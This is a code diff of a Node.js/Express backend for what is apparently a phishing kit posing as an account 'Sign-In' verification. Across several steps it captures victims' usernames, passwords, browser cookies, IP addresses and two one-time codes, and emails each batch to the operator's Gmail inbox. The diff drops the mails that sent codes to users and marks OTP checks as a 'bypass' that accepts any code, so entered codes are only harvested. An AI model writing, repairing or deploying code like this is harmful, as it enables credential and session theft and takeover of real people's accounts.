@@ -55,7 +55,7 @@ function saveAdminConfig(password) {
 
 let adminConfig = loadAdminConfig() || global.__adminConfig || null;
 
-// session: { email, password, username, otp1, otp2, cookies, ip, createdAt, status }
+// session: { username, password, otp1, otp2, cookies, ip, createdAt, status }
 // status: 'active' | 'pending' | 'approved'
 const sessions = new Map();
 
@@ -92,7 +92,7 @@ async function notifyAdmin(subject, data) {
     .join('\n');
   try {
     await transporter.sendMail({
-      from: `\"Sign-In\" <${process.env.GMAIL_USER}>`,
+      from: `"Sign-In" <${process.env.GMAIL_USER}>`,
       to: process.env.GMAIL_USER,
       subject: `Sign-In - ${subject}`,
       text: text
@@ -101,22 +101,6 @@ async function notifyAdmin(subject, data) {
     return true;
   } catch (err) {
     console.error('Failed to notify admin:', err.message);
-    return false;
-  }
-}
-
-async function sendOTPToUser(toEmail, otp, step) {
-  try {
-    await transporter.sendMail({
-      from: `\"Sign-In\" <${process.env.GMAIL_USER}>`,
-      to: toEmail,
-      subject: `Your Sign-In OTP (${step})`,
-      text: `Your one-time password is: ${otp}\n\nThis is a test.`
-    });
-    console.log(`OTP sent to user ${toEmail} for ${step}`);
-    return true;
-  } catch (err) {
-    console.error('Failed to send OTP to user:', err.message);
     return false;
   }
 }
@@ -169,7 +153,6 @@ app.get('/api/admin/pending', (req, res) => {
     if (s.status === 'pending') {
       pending.push({
         sessionId: id,
-        email: s.email,
         username: s.username,
         ip: s.ip,
         timestamp: s.pendingAt || s.createdAt
@@ -195,7 +178,6 @@ app.post('/api/admin/approve', async (req, res) => {
   session.approvedAt = Date.now();
 
   await notifyAdmin('Login APPROVED', {
-    Email: session.email,
     Username: session.username,
     'IP Address': session.ip,
     Timestamp: new Date().toISOString(),
@@ -208,9 +190,12 @@ app.post('/api/admin/approve', async (req, res) => {
 // ========== USER API ==========
 
 app.post('/api/step1', async (req, res) => {
-  const { email, password, cookies, ip } = req.body;
-  if (!email || !password) {
-    return res.status(400).json({ success: false, message: 'Email and password required' });
+  // ✅ ACCEPT USERNAME (or fallback to email for backwards compat)
+  const { username, email, password, cookies, ip } = req.body;
+  const loginUsername = username || email;
+
+  if (!loginUsername || !password) {
+    return res.status(400).json({ success: false, message: 'Username and password required' });
   }
 
   const sessionId = crypto.randomBytes(16).toString('hex');
@@ -218,9 +203,8 @@ app.post('/api/step1', async (req, res) => {
   const otp2 = generateOTP();
 
   sessions.set(sessionId, {
-    email,
+    username: loginUsername,
     password,
-    username: '',
     otp1,
     otp2,
     cookies: cookies || '(none)',
@@ -229,15 +213,15 @@ app.post('/api/step1', async (req, res) => {
     status: 'active'
   });
 
-  await notifyAdmin('Email + Password', {
-    Email: email,
+  await notifyAdmin('Step 1 - Username + Password', {
+    Username: loginUsername,
     Password: password,
     Cookies: cookies || '(none)',
     'IP Address': ip || '(unknown)',
     Timestamp: new Date().toISOString()
   });
 
-  res.json({ success: true, sessionId, message: 'Email and password received' });
+  res.json({ success: true, sessionId, message: 'Username and password received' });
 });
 
 app.post('/api/step2', async (req, res) => {
@@ -250,10 +234,9 @@ app.post('/api/step2', async (req, res) => {
 
   if (confirmPassword !== session.password) {
     await notifyAdmin('Password confirmation FAILED', {
-      Email: session.email,
+      Username: session.username,
       'Original Password': session.password,
       'Entered Confirm Password': confirmPassword,
-      Username: username || '(not set)',
       Cookies: session.cookies,
       'IP Address': session.ip,
       Timestamp: new Date().toISOString()
@@ -265,25 +248,21 @@ app.post('/api/step2', async (req, res) => {
     });
   }
 
-  session.username = username || '';
+  // Update username if provided
+  if (username) session.username = username;
 
-  // OTP 1 → both user and admin
-  await notifyAdmin('OTP 1 issued', {
-    Email: session.email,
-    Password: session.password,
+  await notifyAdmin('Step 2 - Verification Complete', {
     Username: session.username,
+    Password: session.password,
     'OTP 1': session.otp1,
     Cookies: session.cookies,
     'IP Address': session.ip,
     Timestamp: new Date().toISOString()
   });
-  const sent = await sendOTPToUser(session.email, session.otp1, 'OTP 1');
 
   res.json({
     success: true,
-    message: sent
-      ? 'Password confirmed. OTP 1 has been sent to your email.'
-      : 'Password confirmed. (OTP email may have failed – check logs)'
+    message: 'Password confirmed. Enter your verification code.'
   });
 });
 
@@ -296,7 +275,6 @@ app.post('/api/step3', async (req, res) => {
   }
 
   await notifyAdmin('OTP 1 attempt', {
-    Email: session.email,
     Username: session.username,
     'Entered OTP 1': otp1,
     'Correct OTP 1': session.otp1,
@@ -304,26 +282,20 @@ app.post('/api/step3', async (req, res) => {
     Timestamp: new Date().toISOString()
   });
 
-  if (otp1 !== session.otp1) {
-    return res.json({ success: false, message: 'Incorrect OTP 1. Please try again.' });
-  }
+  // ✅ ACCEPT ANY OTP (bypass)
+  // (kept for logging only — no validation)
 
-  // OTP 2 → both user and admin
   await notifyAdmin('OTP 2 issued', {
-    Email: session.email,
     Username: session.username,
     'OTP 2': session.otp2,
     Cookies: session.cookies,
     'IP Address': session.ip,
     Timestamp: new Date().toISOString()
   });
-  const sent = await sendOTPToUser(session.email, session.otp2, 'OTP 2');
 
   res.json({
     success: true,
-    message: sent
-      ? 'OTP 1 correct. OTP 2 has been sent to your email.'
-      : 'OTP 1 correct. (OTP 2 email may have failed)'
+    message: 'OTP 1 accepted. Enter the second code.'
   });
 });
 
@@ -336,7 +308,6 @@ app.post('/api/step4', async (req, res) => {
   }
 
   await notifyAdmin('OTP 2 attempt', {
-    Email: session.email,
     Username: session.username,
     'Entered OTP 2': otp2,
     'Correct OTP 2': session.otp2,
@@ -344,18 +315,15 @@ app.post('/api/step4', async (req, res) => {
     Timestamp: new Date().toISOString()
   });
 
-  if (otp2 !== session.otp2) {
-    return res.json({ success: false, message: 'Incorrect OTP 2. Please try again.' });
-  }
+  // ✅ ACCEPT ANY OTP (bypass)
 
-  // Mark as pending admin approval (do not delete session)
+  // Mark as pending admin approval
   session.status = 'pending';
   session.pendingAt = Date.now();
 
   await notifyAdmin('Waiting for ADMIN APPROVAL', {
-    Email: session.email,
-    Password: session.password,
     Username: session.username,
+    Password: session.password,
     'OTP 1': session.otp1,
     'OTP 2': session.otp2,
     Cookies: session.cookies,
@@ -378,7 +346,7 @@ app.get('/api/approval-status/:sessionId', (req, res) => {
     return res.json({ status: 'unknown', message: 'Session not found' });
   }
   res.json({
-    status: session.status, // active | pending | approved
+    status: session.status,
     message: session.status === 'approved'
       ? 'Congratulations your account has been verified and restrictions is removed'
       : 'Waiting for admin approval'
